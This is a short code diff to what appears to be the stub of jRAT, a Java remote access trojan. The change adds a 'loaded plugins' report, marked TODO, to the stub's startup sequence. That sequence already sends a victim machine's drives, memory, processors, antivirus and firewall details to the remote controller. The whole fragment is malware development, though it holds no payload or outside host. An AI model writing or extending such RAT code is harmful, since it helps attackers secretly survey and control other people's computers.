@@ -27,6 +27,7 @@ import io.jrat.stub.packets.outgoing.Packet61InitMonitors;
 import io.jrat.stub.packets.outgoing.Packet62InitDrives;
 import io.jrat.stub.packets.outgoing.Packet63InitRAM;
 import io.jrat.stub.packets.outgoing.Packet64InitAvailableProcessors;
+import io.jrat.stub.packets.outgoing.Packet67LoadedPlugins;
 import io.jrat.stub.packets.outgoing.Packet69InitAntivirus;
 import io.jrat.stub.packets.outgoing.Packet70InitFirewall;
 
@@ -176,6 +177,8 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet69InitAntivirus());
 
 		addToSendQueue(new Packet70InitFirewall());
+		
+		addToSendQueue(new Packet67LoadedPlugins()); // TODO
 		
 		addToSendQueue(new Packet36Initialized());
 	}
